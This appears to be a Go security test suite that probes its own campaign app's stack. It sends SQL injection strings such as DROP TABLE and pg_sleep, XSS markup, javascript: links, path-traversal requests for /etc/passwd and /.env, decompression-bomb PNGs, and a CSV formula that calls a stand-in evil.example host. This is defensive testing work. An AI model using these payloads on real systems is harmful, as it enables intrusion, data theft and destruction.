//go:build verify

// Package security probes the running verification stack from outside, the way an
// attacker would: requests without a session, forged signatures, hostile uploads,
// SQL and markup in every field, oversized bodies and path tricks. Each check states
// what must hold and fails when it does not. Known open items (see docs/security.md)
// are recorded in the results, not failed.
//
// Start the stack with `make verify-up`, then run `make verify-security`.
package security

import (
	"bytes"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"hash/crc32"
	"image"
	"image/jpeg"
	"image/png"
	"io"
	"mime/multipart"
	"net"
	"net/http"
	"net/textproto"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/negativexq/smart-campaign-composer/tests/verify/stack"
)

// The stack's development secrets, unless the run sets its own.
var (
	webhookSecret     = env("PROVIDER_WEBHOOK_SECRET", "local-mock-webhook-secret")
	unsubscribeSecret = env("UNSUBSCRIBE_SECRET", "local-unsubscribe-secret")
)

func env(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}

// record is one check's outcome for the results file.
type record struct {
	ID     string `json:"id"`
	Check  string `json:"check"`
	Result string `json:"result"` // pass, fail or open (a known open item)
	Detail string `json:"detail"`
}

type recorder struct {
	mu      sync.Mutex
	records []record
}

// check runs one probe as a subtest. The probe returns its detail and an error
// when what must hold did not.
func (r *recorder) check(t *testing.T, id, name string, probe func(t *testing.T) (string, error)) {
	t.Run(id+" "+name, func(t *testing.T) {
		detail, err := probe(t)
		result := "pass"
		if err != nil {
			result = "fail"
			t.Error(err)
		}
		t.Log(detail)
		r.add(record{id, name, result, detail})
	})
}

// open records a known open item with what the probe saw.
func (r *recorder) open(t *testing.T, id, name string, probe func(t *testing.T) string) {
	t.Run(id+" "+name, func(t *testing.T) {
		detail := probe(t)
		t.Log("open item: " + detail)
		r.add(record{id, name, "open", detail})
	})
}

func (r *recorder) add(rec record) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.records = append(r.records, rec)
}

// fixture is the finished campaign the probes read and write.
type fixture struct {
	campaign string
	delivery string
	key      string // a sent message's idempotency key
	user     string // a sent message's user
}

func TestProbes(t *testing.T) {
	started := time.Now()
	// A healthy provider, so the fixture campaign finishes quickly.
	stack.Compose(t, map[string]string{"VERIFY_429": "0", "VERIFY_5XX": "0", "VERIFY_LOST": "0", "VERIFY_401": ""},
		"up", "-d", "--no-deps", "--force-recreate", "--wait", "mock-provider")
	f := newFixture(t)
	r := &recorder{}

	r.check(t, "S1", "every route needs a valid session", func(t *testing.T) (string, error) { return authMatrix(t, f) })
	r.check(t, "S2", "webhook signatures are checked", func(t *testing.T) (string, error) { return webhookSignatures(t, f) })
	r.check(t, "S3", "a replayed webhook changes nothing", func(t *testing.T) (string, error) { return webhookReplay(t, f) })
	r.check(t, "S4", "webhook content is validated", func(t *testing.T) (string, error) { return webhookContent(t) })
	r.check(t, "S5", "an unsubscribe link cannot be changed", func(t *testing.T) (string, error) { return unsubscribeTampering(t, f) })
	r.check(t, "S6", "only real images upload", func(t *testing.T) (string, error) { return nonImages(t) })
	r.check(t, "S7", "decompression bombs are refused by their header", func(t *testing.T) (string, error) { return bombs(t) })
	r.check(t, "S8", "file names cannot climb directories", func(t *testing.T) (string, error) { return fileNames(t) })
	r.check(t, "S9", "uploaded images lose their metadata", func(t *testing.T) (string, error) { return metadata(t) })
	r.check(t, "S10", "asset paths cannot climb directories", func(t *testing.T) (string, error) { return assetPaths(t) })
	r.check(t, "S11", "SQL in query strings and paths is data", func(t *testing.T) (string, error) { return sqlReads(t, f) })
	r.check(t, "S12", "SQL in written fields is data", func(t *testing.T) (string, error) { return sqlWrites(t, f) })
	r.check(t, "S13", "email markup and links are escaped", func(t *testing.T) (string, error) { return emailEscaping(t) })
	r.check(t, "S14", "a javascript: call-to-action link is refused", func(t *testing.T) (string, error) { return javascriptLinks(t, f) })
	r.check(t, "S15", "CSV exports do not run formulas", func(t *testing.T) (string, error) { return csvFormulas(t, f) })
	r.check(t, "S16", "oversized and broken bodies are refused", func(t *testing.T) (string, error) { return badBodies(t, f) })
	r.check(t, "S17", "nginx serves no files outside the app", func(t *testing.T) (string, error) { return nginxPaths(t) })
	r.check(t, "S18", "logs hold no personal data or secrets", func(t *testing.T) (string, error) { return logs(t) })
	r.check(t, "S19", "error answers reveal no internals", func(t *testing.T) (string, error) { return errorAnswers(t) })

	r.open(t, "O1", "security headers", func(t *testing.T) string { return headers(t) })
	r.open(t, "O2", "metrics without a session", func(t *testing.T) string { return metrics(t) })

	stack.WriteResult(t, stack.Stamp("security", started), r.records, report(started, r.records))
}

func newFixture(t *testing.T) fixture {
	campaign := stack.Approved(t, "Send a 10% discount to users in Bursa")
	stack.Dispatch(t, campaign)
	stack.WaitFinished(t, campaign, 10*time.Minute)
	row := strings.Split(stack.SQL(t, `SELECT id, idempotency_key, user_id FROM campaign_deliveries WHERE campaign_id = '%s' AND status = 'SENT' ORDER BY id LIMIT 1`, campaign), "|")
	if len(row) != 3 {
		t.Fatalf("no sent message in the fixture campaign: %v", row)
	}
	return fixture{campaign: campaign, delivery: row[0], key: row[1], user: row[2]}
}

func get(t *testing.T, path string, cookie *http.Cookie) stack.Response {
	return stack.Do(t, stack.Request{Method: http.MethodGet, URL: stack.APIURL() + path, Cookie: cookie})
}

func newID() string {
	var b [16]byte
	_, _ = rand.Read(b[:])
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}

// S1

var routes = []string{
	"GET /api/overview", "GET /api/settings", "GET /api/email-templates", "GET /api/brand", "PUT /api/brand",
	"GET /api/email-designs", "POST /api/email-designs", "PUT /api/email-designs/X", "DELETE /api/email-designs/X",
	"GET /api/delivery-monitor", "GET /api/analytics", "GET /api/channels", "GET /api/audiences", "POST /api/audiences",
	"POST /api/audiences/X/recount", "DELETE /api/audiences/X", "GET /api/campaigns", "POST /api/campaigns",
	"GET /api/campaigns/C", "PATCH /api/campaigns/C", "PUT /api/campaigns/C/languages", "POST /api/campaigns/C/segment",
	"GET /api/campaigns/C/audience", "GET /api/campaigns/C/audience/breakdown", "POST /api/campaigns/C/generate",
	"PUT /api/campaigns/C/content", "GET /api/campaigns/C/sample-recipients", "POST /api/email-preview",
	"POST /api/campaigns/C/approve", "POST /api/campaigns/C/dispatch", "POST /api/campaigns/C/resume", "GET /api/notifications",
	"POST /api/campaigns/C/schedule", "DELETE /api/campaigns/C/schedule", "GET /api/campaigns/C/progress",
	"GET /api/campaigns/C/events", "GET /api/campaigns/C/deliveries", "GET /api/campaigns/C/deliveries.csv",
	"GET /api/campaigns/C/delivery-cities", "POST /api/campaigns/C/duplicate", "GET /api/campaigns/C/report",
	"GET /api/campaigns/C/deliveries/D/attempts", "GET /api/campaigns/C/activity", "GET /api/assets", "POST /api/assets",
	"DELETE /api/assets/X",
}

func authMatrix(t *testing.T, f fixture) (string, error) {
	cookies := []*http.Cookie{stack.NoCookie, {Name: "scc_session", Value: ""}, {Name: "scc_session", Value: "a%20b"}, {Name: "scc_session", Value: "%zz"}}
	var wrong []string
	for _, route := range routes {
		method, path, _ := strings.Cut(route, " ")
		path = strings.Replace(path, "/C", "/"+f.campaign, 1)
		path = strings.Replace(path, "/D/", "/"+f.delivery+"/", 1)
		path = strings.Replace(path, "/X", "/"+newID(), 1)
		for _, cookie := range cookies {
			request := stack.Request{Method: method, URL: stack.APIURL() + path, Cookie: cookie}
			if method != http.MethodGet && method != http.MethodDelete {
				request.Raw = []byte("{}")
			}
			if status := stack.Do(t, request).Status; status != http.StatusUnauthorized {
				wrong = append(wrong, fmt.Sprintf("%s %s with %q: %d", method, path, cookie.Value, status))
			}
		}
	}
	detail := fmt.Sprintf("%d routes, %d cookie forms", len(routes), len(cookies))
	if len(wrong) > 0 {
		return detail, fmt.Errorf("answered without a valid session: %v", wrong)
	}
	return detail, nil
}

// S2-S4

func event(key, kind, at string) []byte {
	encoded, _ := json.Marshal(map[string]string{"event": kind, "channel": "sms", "message_id": "x", "idempotency_key": key, "occurred_at": at})
	return encoded
}

func sign(body []byte, secret string) string {
	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write(body)
	return hex.EncodeToString(mac.Sum(nil))
}

func postEvent(t *testing.T, body []byte, signature *string) int {
	request := stack.Request{Method: http.MethodPost, URL: stack.APIURL() + "/api/provider/events", Raw: body, Cookie: stack.NoCookie, Header: map[string]string{"Content-Type": "application/json"}}
	if signature != nil {
		request.Header["X-Provider-Signature"] = *signature
	}
	return stack.Do(t, request).Status
}

func ptr(s string) *string { return &s }

func webhookSignatures(t *testing.T, f fixture) (string, error) {
	body := event(f.key, "opened", "2026-01-01T00:00:00Z")
	tries := map[string]*string{
		"none": nil, "wrong": ptr(strings.Repeat("00", 32)), "not hex": ptr("zzzz"), "empty": ptr(""),
		"another body's": ptr(sign(event(f.key, "bounced", "2026-01-01T00:00:00Z"), webhookSecret)),
	}
	got := map[string]int{}
	var err error
	for name, signature := range tries {
		got[name] = postEvent(t, body, signature)
		if got[name] != http.StatusUnauthorized {
			err = fmt.Errorf("a %s signature got %d", name, got[name])
		}
	}
	return fmt.Sprint(got), err
}

func webhookReplay(t *testing.T, f fixture) (string, error) {
	body := event(f.key, "opened", "2026-01-02T00:00:00Z")
	first, second := postEvent(t, body, ptr(sign(body, webhookSecret))), postEvent(t, body, ptr(sign(body, webhookSecret)))
	rows := stack.SQL(t, `SELECT count(*) FROM delivery_events WHERE event_type = 'opened' AND delivery_id = '%s'`, f.delivery)
	detail := fmt.Sprintf("first %d, again %d, rows %s", first, second, rows)
	if first >= 300 || rows != "1" {
		return detail, fmt.Errorf("the same event twice left %s rows", rows)
	}
	return detail, nil
}

func webhookContent(t *testing.T) (string, error) {
	unknownKey := event("not-a-real-key", "opened", "2026-01-01T00:00:00Z")
	unknownEvent := event("x", "hacked", "2026-01-01T00:00:00Z")
	big := bytes.Repeat([]byte("x"), 70<<10)
	k, e, b := postEvent(t, unknownKey, ptr(sign(unknownKey, webhookSecret))), postEvent(t, unknownEvent, ptr(sign(unknownEvent, webhookSecret))), postEvent(t, big, ptr(sign(big, webhookSecret)))
	detail := fmt.Sprintf("unknown key %d, unknown event %d, 70 KB body %d", k, e, b)
	if k != http.StatusNotFound || e != http.StatusBadRequest || b != http.StatusBadRequest {
		return detail, fmt.Errorf("want 404, 400 and 400")
	}
	return detail, nil
}

// S5

func token(user, secret string) string {
	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write([]byte(user))
	return user + "." + base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
}

func unsubscribeTampering(t *testing.T, f fixture) (string, error) {
	good := token(f.user, unsubscribeSecret)
	_, signature, _ := strings.Cut(good, ".")
	id, _ := strconv.ParseInt(f.user, 10, 64)
	tries := []string{strconv.FormatInt(id+1, 10) + "." + signature, token(f.user, "wrong"), f.user + ".", f.user, "0." + signature}
	var got []int
	var err error
	for _, try := range tries {
		status := stack.Do(t, stack.Request{Method: http.MethodPost, URL: stack.APIURL() + "/api/unsubscribe/" + url.PathEscape(try), Cookie: stack.NoCookie}).Status
		got = append(got, status)
		if status != http.StatusNotFound {
			err = fmt.Errorf("a changed link %q got %d", try, status)
		}
	}
	if err != nil {
		return fmt.Sprintf("5 changed links: %v", got), err
	}
	// The unchanged link works, so the refusals above are about the changes.
	status := stack.Do(t, stack.Request{Method: http.MethodPost, URL: stack.APIURL() + "/api/unsubscribe/" + url.PathEscape(good), Cookie: stack.NoCookie}).Status
	if status >= 300 {
		return fmt.Sprintf("5 changed links: %v, the real link %d", got, status), fmt.Errorf("the real link did not work")
	}
	return fmt.Sprintf("5 changed links: %v, the real link %d", got, status), nil
}

// S6-S10

func chunk(kind string, data []byte) []byte {
	var b bytes.Buffer
	_ = binary.Write(&b, binary.BigEndian, uint32(len(data)))
	b.WriteString(kind)
	b.Write(data)
	_ = binary.Write(&b, binary.BigEndian, crc32.ChecksumIEEE(append([]byte(kind), data...)))
	return b.Bytes()
}

// pngWith encodes a small image and adds extra chunks after its header.
func pngWith(t *testing.T, side int, extra []byte) []byte {
	img := image.NewRGBA(image.Rect(0, 0, side, side))
	for i := range img.Pix {
		img.Pix[i] = 0xff
	}
	var b bytes.Buffer
	if err := png.Encode(&b, img); err != nil {
		t.Fatal(err)
	}
	encoded := b.Bytes()
	headerEnd := 8 + 25 // signature, then the IHDR chunk
	return append(append(append([]byte{}, encoded[:headerEnd]...), extra...), encoded[headerEnd:]...)
}

// headerOnlyPNG claims a size its little data does not have.
func headerOnlyPNG(width, height uint32) []byte {
	header := make([]byte, 13)
	binary.BigEndian.PutUint32(header[0:], width)
	binary.BigEndian.PutUint32(header[4:], height)
	header[8], header[9] = 8, 2
	out := []byte("\x89PNG\r\n\x1a\n")
	out = append(out, chunk("IHDR", header)...)
	out = append(out, chunk("IDAT", []byte{0x78, 0x9c, 0x63, 0, 0, 0, 1, 0, 1})...)
	return append(out, chunk("IEND", nil)...)
}

func upload(t *testing.T, name string, data []byte, contentType string) stack.Response {
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)
	header := textproto.MIMEHeader{}
	header.Set("Content-Disposition", fmt.Sprintf(`form-data; name="file"; filename=%q`, name))
	header.Set("Content-Type", contentType)
	part, err := writer.CreatePart(header)
	if err != nil {
		t.Fatal(err)
	}
	part.Write(data)
	writer.Close()
	return stack.Do(t, stack.Request{Method: http.MethodPost, URL: stack.APIURL() + "/api/assets", Raw: body.Bytes(), Header: map[string]string{"Content-Type": writer.FormDataContentType()}})
}

func nonImages(t *testing.T) (string, error) {
	tries := []struct {
		name, contentType string
		data              []byte
	}{
		{"text", "text/plain", []byte("hello")},
		{"svg with script", "image/svg+xml", []byte(`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`)},
		{"html named png", "image/png", []byte("<html><script>alert(1)</script>")},
		{"gif", "image/gif", append([]byte("GIF89a"), make([]byte, 20)...)},
		{"7 MB", "image/png", append([]byte("\x89PNG"), make([]byte, 7<<20)...)},
		{"empty", "image/png", nil},
	}
	got := map[string]int{}
	var err error
	for _, try := range tries {
		got[try.name] = upload(t, "a.png", try.data, try.contentType).Status
		if got[try.name] != http.StatusBadRequest && got[try.name] != http.StatusRequestEntityTooLarge {
			err = fmt.Errorf("%s uploaded with %d", try.name, got[try.name])
		}
	}
	return fmt.Sprint(got), err
}

func bombs(t *testing.T) (string, error) {
	// Refused for their size, read from the header, not for the data that is missing.
	var got []int
	for _, side := range []uint32{30000, 6000} {
		response := upload(t, "bomb.png", headerOnlyPNG(side, side), "image/png")
		got = append(got, response.Status)
		if response.Status != http.StatusBadRequest || !bytes.Contains(response.Body, []byte("megapixels")) {
			return fmt.Sprint(got), fmt.Errorf("%dx%d was not refused for its size: %d %.120s", side, side, response.Status, response.Body)
		}
	}
	return fmt.Sprintf("30000x30000 and 6000x6000 refused for their size: %v", got), nil
}

func fileNames(t *testing.T) (string, error) {
	response := upload(t, "../../../etc/passwd.png", pngWith(t, 33, nil), "image/png")
	asset := stack.Decode[struct{ Name string }](t, response.Body)
	detail := fmt.Sprintf("%d, stored name %q", response.Status, asset.Name)
	if response.Status != http.StatusCreated || strings.Contains(asset.Name, "/") {
		return detail, fmt.Errorf("the name kept its path")
	}
	return detail, nil
}

func metadata(t *testing.T) (string, error) {
	marker := []byte("SECRET-METADATA-MARKER")
	pngUpload := upload(t, "meta.png", pngWith(t, 35, chunk("tEXt", append([]byte("Comment\x00"), marker...))), "image/png")

	img := image.NewRGBA(image.Rect(0, 0, 64, 64))
	for i := range img.Pix {
		img.Pix[i] = 0xff
	}
	var encoded bytes.Buffer
	if err := jpeg.Encode(&encoded, img, nil); err != nil {
		t.Fatal(err)
	}
	app1 := append([]byte("Exif\x00\x00"), marker...)
	segment := append([]byte{0xff, 0xe1, byte((len(app1) + 2) >> 8), byte(len(app1) + 2)}, app1...)
	jpegData := append(append(append([]byte{}, encoded.Bytes()[:2]...), segment...), encoded.Bytes()[2:]...)
	jpegUpload := upload(t, "meta.jpg", jpegData, "image/jpeg")

	kept := map[string]bool{}
	for name, response := range map[string]stack.Response{"png": pngUpload, "jpeg": jpegUpload} {
		if response.Status != http.StatusCreated {
			return fmt.Sprintf("%s upload %d", name, response.Status), fmt.Errorf("a valid %s did not upload", name)
		}
		asset := stack.Decode[struct{ ID string }](t, response.Body)
		file := get(t, "/api/assets/"+asset.ID+"/file", stack.NoCookie)
		if file.Status != http.StatusOK {
			return fmt.Sprintf("%s file %d", name, file.Status), fmt.Errorf("the uploaded %s could not be read back", name)
		}
		kept[name] = bytes.Contains(file.Body, marker)
	}
	detail := fmt.Sprintf("marker kept: %v", kept)
	if kept["png"] || kept["jpeg"] {
		return detail, fmt.Errorf("metadata survived the upload")
	}
	return detail, nil
}

func assetPaths(t *testing.T) (string, error) {
	var got []int
	var err error
	for _, path := range []string{"/api/assets/..%2f..%2f..%2fetc%2fpasswd/file", "/api/assets/%2e%2e/file", "/api/assets/" + newID() + "/file"} {
		response := get(t, path, stack.NoCookie)
		got = append(got, response.Status)
		if (response.Status != http.StatusBadRequest && response.Status != http.StatusNotFound) || bytes.Contains(response.Body, []byte("root:")) {
			err = fmt.Errorf("%s answered %d", path, response.Status)
		}
	}
	return fmt.Sprint(got), err
}

// S11-S12

var sqlPayloads = []string{"' OR '1'='1", "'; DROP TABLE users;--", "1; SELECT pg_sleep(3)--", "' UNION SELECT null,version()--", "'||pg_sleep(3)||'", `\`, "%", "../../"}

func sqlReads(t *testing.T, f fixture) (string, error) {
	c := f.campaign
	targets := []string{
		"/api/campaigns?q=%s", "/api/campaigns?sort=%s", "/api/campaigns?group=%s", "/api/campaigns?channel=%s", "/api/campaigns?created_within_days=%s",
		"/api/delivery-monitor?status=%s", "/api/delivery-monitor?channel=%s", "/api/delivery-monitor?outcome=%s", "/api/delivery-monitor?reason=%s", "/api/analytics?days=%s",
		"/api/campaigns/" + c + "/deliveries?status=%s", "/api/campaigns/" + c + "/deliveries?channel=%s", "/api/campaigns/" + c + "/deliveries?q=%s",
		"/api/campaigns/" + c + "/deliveries?city=%s", "/api/campaigns/" + c + "/deliveries?sort=%s", "/api/campaigns/" + c + "/deliveries?reason=%s",
		"/api/campaigns/" + c + "/deliveries?from=%s", "/api/campaigns/" + c + "/deliveries?calls=%s", "/api/campaigns/" + c + "/deliveries?opened=%s",
		"/api/campaigns/" + c + "/deliveries?arrival=%s", "/api/campaigns/" + c + "/deliveries.csv?status=%s",
		"/api/campaigns/%s", "/api/campaigns/%s/report", "/api/campaigns/%s/deliveries", "/api/assets/%s/file",
	}
	var problems []string
	requests := 0
	leak := regexp.MustCompile(`PostgreSQL|syntax error|SQLSTATE`)
	for _, target := range targets {
		for _, payload := range sqlPayloads {
			path := fmt.Sprintf(target, url.QueryEscape(payload))
			began := time.Now()
			response := get(t, path, nil)
			requests++
			switch {
			case response.Status >= 500:
				problems = append(problems, fmt.Sprintf("%s: %d", path, response.Status))
			case leak.Match(response.Body):
				problems = append(problems, path+": database error in the answer")
			case time.Since(began) > 2500*time.Millisecond:
				problems = append(problems, fmt.Sprintf("%s took %s", path, time.Since(began).Round(100*time.Millisecond)))
			}
		}
	}
	detail := fmt.Sprintf("%d requests, users %s", requests, stack.SQL(t, "SELECT count(*) FROM users"))
	if len(problems) > 0 {
		return detail, fmt.Errorf("%v", problems)
	}
	return detail, nil
}

func sqlWrites(t *testing.T, f fixture) (string, error) {
	created := stack.Decode[struct{ ID string }](t, stack.API(t, http.MethodPost, "/api/campaigns", map[string]string{"brief": "Robert'); DROP TABLE users;-- users in Ankara"}, http.StatusCreated))
	name := stack.Do(t, stack.Request{Method: http.MethodPatch, URL: stack.APIURL() + "/api/campaigns/" + created.ID, JSON: map[string]string{"name": "x'; DROP TABLE campaigns;--"}}).Status
	audience := stack.Do(t, stack.Request{Method: http.MethodPost, URL: stack.APIURL() + "/api/audiences", JSON: map[string]string{"campaign_id": f.campaign, "name": "'; DROP TABLE saved_segments;-- " + newID()[:8]}}).Status
	tables := stack.SQL(t, "SELECT to_regclass('users') IS NOT NULL AND to_regclass('campaigns') IS NOT NULL AND to_regclass('saved_segments') IS NOT NULL")
	detail := fmt.Sprintf("name %d, audience %d, tables intact %s", name, audience, tables)
	// Both writes must be stored, or the check proves nothing.
	if tables != "t" || name != http.StatusOK || audience != http.StatusCreated {
		return detail, fmt.Errorf("a written field reached the database as SQL")
	}
	return detail, nil
}

// S13-S15

const markup = `<img src=x onerror=alert(1)><script>alert(2)</script>`

func emailEscaping(t *testing.T) (string, error) {
	response := stack.Do(t, stack.Request{Method: http.MethodPost, URL: stack.APIURL() + "/api/email-preview", JSON: map[string]string{
		"sms": "x", "email_subject": markup, "email_body": markup + "\n\nmore", "email_headline": markup,
		"email_cta_label": "go", "email_cta_url": "javascript:alert(1)", "first_name": markup,
	}})
	if response.Status == http.StatusBadRequest {
		return "refused with 400", nil
	}
	html := stack.Decode[struct{ HTML string }](t, response.Body).HTML
	detail := fmt.Sprintf("%d, %d bytes of HTML", response.Status, len(html))
	if response.Status != http.StatusOK || strings.Contains(html, "<script>alert") || strings.Contains(html, "<img src=x") || strings.Contains(html, "javascript:") {
		return detail, fmt.Errorf("markup or a javascript: link reached the email")
	}
	return detail, nil
}

func javascriptLinks(t *testing.T, f fixture) (string, error) {
	copied := stack.Decode[struct{ ID string }](t, stack.API(t, http.MethodPost, "/api/campaigns/"+f.campaign+"/duplicate", map[string]string{}, http.StatusCreated))
	for _, step := range []string{"segment", "generate"} {
		stack.API(t, http.MethodPost, "/api/campaigns/"+copied.ID+"/"+step, map[string]string{}, http.StatusOK)
	}
	generated := stack.Decode[struct{ Content map[string]any }](t, stack.API(t, http.MethodGet, "/api/campaigns/"+copied.ID, nil, http.StatusOK)).Content
	// Only the fields a save takes: the API refuses unknown ones before it looks at the link.
	content := map[string]any{}
	for _, field := range []string{"sms", "email_subject", "email_body", "email_preheader", "email_headline", "email_template", "language"} {
		content[field] = generated[field]
	}
	save := func(link string) stack.Response {
		content["email_cta_label"], content["email_cta_url"] = "Go", link
		return stack.Do(t, stack.Request{Method: http.MethodPut, URL: stack.APIURL() + "/api/campaigns/" + copied.ID + "/content", JSON: content})
	}
	// The same body with a normal link saves, so a refusal below is about the link.
	if safe := save("https://example.com/offer"); safe.Status != http.StatusOK {
		return fmt.Sprintf("https link %d %.150s", safe.Status, safe.Body), fmt.Errorf("a valid save was refused")
	}
	response := save("javascript:alert(1)")
	detail := fmt.Sprintf("https link 200, javascript: link %d %.120s", response.Status, response.Body)
	if response.Status != http.StatusUnprocessableEntity || !bytes.Contains(response.Body, []byte("invalid_link")) {
		return detail, fmt.Errorf("a javascript: link was not refused as an invalid link")
	}
	return detail, nil
}

func csvFormulas(t *testing.T, f fixture) (string, error) {
	formula := `=HYPERLINK("http://evil.example/?x="&A1,"click")`
	stack.SQL(t, `UPDATE users SET first_name = '%s', city = '+cmd|calc' WHERE id = %s`, strings.ReplaceAll(formula, "'", "''"), f.user)
	response := get(t, "/api/campaigns/"+f.campaign+"/deliveries.csv", nil)
	for _, line := range strings.Split(string(response.Body), "\n") {
		if strings.Contains(line, "HYPERLINK") {
			if strings.Contains(line, "'=HYPERLINK") {
				return "escaped: " + line[:min(len(line), 100)], nil
			}
			return line, fmt.Errorf("a formula cell was not escaped")
		}
	}
	return fmt.Sprintf("%d", response.Status), fmt.Errorf("the changed row is not in the export")
}

// S16

func badBodies(t *testing.T, f fixture) (string, error) {
	post := func(raw []byte) int {
		return stack.Do(t, stack.Request{Method: http.MethodPost, URL: stack.APIURL() + "/api/campaigns", Raw: raw, Header: map[string]string{"Content-Type": "application/json"}}).Status
	}
	large := post(append(append([]byte(`{"brief":"`), bytes.Repeat([]byte("x"), 2<<20)...), '"', '}'))
	nested := post(bytes.Repeat([]byte("["), 100000))
	broken := post([]byte("not json"))
	limits := get(t, "/api/campaigns/"+f.campaign+"/deliveries?limit=100000000&offset=-5", nil).Status
	days := get(t, "/api/analytics?days=999999999999", nil).Status
	detail := fmt.Sprintf("2 MB %d, nested %d, broken %d, huge limit %d, huge days %d", large, nested, broken, limits, days)
	if (large != http.StatusBadRequest && large != http.StatusRequestEntityTooLarge) || nested != http.StatusBadRequest || broken != http.StatusBadRequest || limits >= 500 || days >= 500 {
		return detail, fmt.Errorf("want 400 or 413 for the bodies and no 5xx")
	}
	return detail, nil
}

// S17-S19

func nginxPaths(t *testing.T) (string, error) {
	host := strings.TrimPrefix(stack.WebURL(), "http://")
	var leaked []string
	for _, path := range []string{"/.env", "/.git/config", "/../../etc/passwd", "/api/../../etc/passwd", "/assets/../../../../etc/passwd", "/nginx.conf"} {
		connection, err := net.DialTimeout("tcp", host, 3*time.Second)
		if err != nil {
			t.Fatal(err)
		}
		connection.SetDeadline(time.Now().Add(3 * time.Second))
		fmt.Fprintf(connection, "GET %s HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n", path)
		answer, _ := io.ReadAll(connection)
		connection.Close()
		if bytes.Contains(answer, []byte("root:")) || bytes.Contains(answer, []byte("[core]")) || bytes.Contains(answer, []byte("worker_processes")) {
			leaked = append(leaked, path)
		}
	}
	if len(leaked) > 0 {
		return fmt.Sprint(leaked), fmt.Errorf("nginx served %v", leaked)
	}
	return "6 paths, nothing served", nil
}

func logs(t *testing.T) (string, error) {
	var all strings.Builder
	for _, service := range []string{"api", "worker", "mock-provider"} {
		all.WriteString(stack.Docker(t, "logs", "--since", "60m", stack.Container(service)))
	}
	text := all.String()
	emails := len(regexp.MustCompile(`[a-z0-9._]+@example\.com`).FindAllString(text, -1)) - strings.Count(text, stack.Session.Value)
	phones := len(regexp.MustCompile(`\+90\d{10}`).FindAllString(text, -1))
	secrets := len(regexp.MustCompile(`local-mock-webhook-secret|local-unsubscribe-secret|scc:scc@`).FindAllString(text, -1))
	detail := fmt.Sprintf("%d lines, emails %d, phones %d, secrets %d", strings.Count(text, "\n"), emails, phones, secrets)
	if emails > 0 || phones > 0 || secrets > 0 {
		return detail, fmt.Errorf("the logs hold personal data or secrets")
	}
	return detail, nil
}

func errorAnswers(t *testing.T) (string, error) {
	wrongType := stack.Do(t, stack.Request{Method: http.MethodPost, URL: stack.APIURL() + "/api/campaigns", Raw: []byte(`{"brief":123}`), Header: map[string]string{"Content-Type": "application/json"}})
	unknown := get(t, "/api/campaigns/"+newID(), nil)
	body := string(wrongType.Body) + string(unknown.Body)
	detail := fmt.Sprintf("wrong type %d, unknown id %d", wrongType.Status, unknown.Status)
	for _, internal := range []string{"pgx", "goroutine", "SQLSTATE", ".go:"} {
		if strings.Contains(body, internal) {
			return detail, fmt.Errorf("an error answer contains %q", internal)
		}
	}
	return detail, nil
}

// Known open items.

func headers(t *testing.T) string {
	response := stack.Do(t, stack.Request{Method: http.MethodGet, URL: stack.WebURL() + "/", Cookie: stack.NoCookie})
	var missing []string
	for _, name := range []string{"Content-Security-Policy", "X-Frame-Options", "X-Content-Type-Options", "Referrer-Policy"} {
		if response.Header.Get(name) == "" {
			missing = append(missing, name)
		}
	}
	return fmt.Sprintf("frontend is missing %v", missing)
}

func metrics(t *testing.T) string {
	return fmt.Sprintf("API /metrics without a session: %d", stack.Do(t, stack.Request{Method: http.MethodGet, URL: stack.APIURL() + "/metrics", Cookie: stack.NoCookie}).Status)
}

func report(started time.Time, records []record) string {
	var b strings.Builder
	fmt.Fprintf(&b, "# Security probes, %s\n\n", started.UTC().Format("2006-01-02 15:04 UTC"))
	b.WriteString("Each probe runs against the verification stack from outside. \"open\" marks a known open item from docs/security.md, recorded but not failed.\n\n")
	b.WriteString("| ID | Check | Result | Detail |\n|---|---|---|---|\n")
	for _, r := range records {
		fmt.Fprintf(&b, "| %s | %s | %s | %s |\n", r.ID, r.Check, r.Result, strings.ReplaceAll(r.Detail, "|", "\\|"))
	}
	return b.String()
}
